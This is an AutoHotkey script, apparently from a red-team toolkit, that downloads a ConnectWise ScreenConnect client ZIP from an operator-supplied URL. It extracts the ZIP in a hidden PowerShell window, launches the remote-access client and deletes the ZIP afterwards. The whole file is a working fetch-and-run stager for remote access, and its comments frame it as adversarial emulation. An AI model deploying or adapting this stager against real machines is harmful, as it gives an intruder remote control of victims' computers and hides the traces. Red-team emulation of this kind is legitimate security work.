; AutoHotKey (AHK) script to download, extract, and run ScreenConnect client for remote support sessions. 
; For AHK, you can install AHK or create a wrapper to run the AHK script with AutoHotkey64 executable. 
; This script is for testing/red team purposes - use only for legal and ethical testing scenarios
; For red team/adversarial emulation, you may want to adapt to your specific purposes.  
; Paste your URL for ConnectWise ScreenConnect where it says (Paste Install URL here).  
; Note: This is not the URL they give you; it is the secondary URL you hunt for via F12, network, and filter on zip.
; See the Readme.md files for how to use, including detailed setup steps.  

; Configuration
downloadUrl := "(Paste Install URL here)"  ; Replace with your ScreenConnect URL
zipName := "ScreenConnect.WindowsClient.zip"
exeName := "ScreenConnect.Client.exe"

; Get script directory
scriptFolder := A_ScriptDir
zipPath := scriptFolder . "\" . zipName

; Download the ZIP file
OutputDebug("Downloading " . zipName . "...")
ToolTip("Downloading " . zipName . "...")

; Use Download to download the file
try {
    Download(downloadUrl, zipPath)
} catch as err {
    OutputDebug("Download failed: " . err.message)
    ToolTip("Download failed: " . err.message)
    ExitApp(1)
}

; Check if download was successful
if (!FileExist(zipPath)) {
    OutputDebug("Download failed. File not found.")
    ToolTip("Download failed. File not found.")
    ExitApp(1)
}

; Check if file size is greater than 0
try {
    fileSize := FileGetSize(zipPath)
    if (fileSize <= 0) {
        OutputDebug("Download failed. File is empty.")
        ToolTip("Download failed. File is empty.")
        ExitApp(1)
    }
} catch {
    OutputDebug("Download failed. Could not check file size.")
    ToolTip("Download failed. Could not check file size.")
    ExitApp(1)
}

OutputDebug("Download complete. Extracting files...")
ToolTip("Download complete. Extracting files...")

; Extract ZIP using PowerShell (most reliable method)
psCommand := "powershell -Command `"Expand-Archive -Path '" . zipPath . "' -DestinationPath '" . scriptFolder . "' -Force`""
RunWait(psCommand, , "Hide")

; Wait for extraction to complete
Sleep(2000)

; Look for the executable
exePath := FindFileRecursive(scriptFolder, exeName)
if (exePath = "") {
    OutputDebug("Error: " . exeName . " not found after extraction.")
    ToolTip("Error: " . exeName . " not found after extraction.")
    ExitApp(1)
}

OutputDebug("Found executable at: " . exePath)
ToolTip("Found executable at: " . exePath)
Sleep(1000)
OutputDebug("Launching application...")
ToolTip("Launching application...")

; Run the executable
try {
    pid := Run('"' . exePath . '"')
    if (pid = 0) {
        OutputDebug("Error: Failed to launch application.")
        ToolTip("Error: Failed to launch application.")
        ExitApp(1)
    }
} catch as err {
    OutputDebug("Error: Failed to launch application - " . err.message)
    ToolTip("Error: Failed to launch application - " . err.message)
    ExitApp(1)
}

; Clean up the ZIP file
if (FileExist(zipPath)) {
    try {
        FileDelete(zipPath)
    } catch {
        ; Ignore cleanup errors
    }
}

OutputDebug("Application launched successfully.")
ToolTip("Application launched successfully.")
Sleep(2000)
ToolTip()  ; Clear tooltip
ExitApp(0)

; Helper function to find file recursively
FindFileRecursive(folder, targetName) {
    ; First check files in current directory
    Loop Files, folder . "\*.*" {
        if (StrLower(A_LoopFileName) = StrLower(targetName)) {
            return A_LoopFileFullPath
        }
    }
    
    ; Then check subdirectories recursively
    Loop Files, folder . "\*.*", "D" {
        result := FindFileRecursive(A_LoopFileFullPath, targetName)
        if (result != "") {
            return result
        }
    }
    
    return ""
}
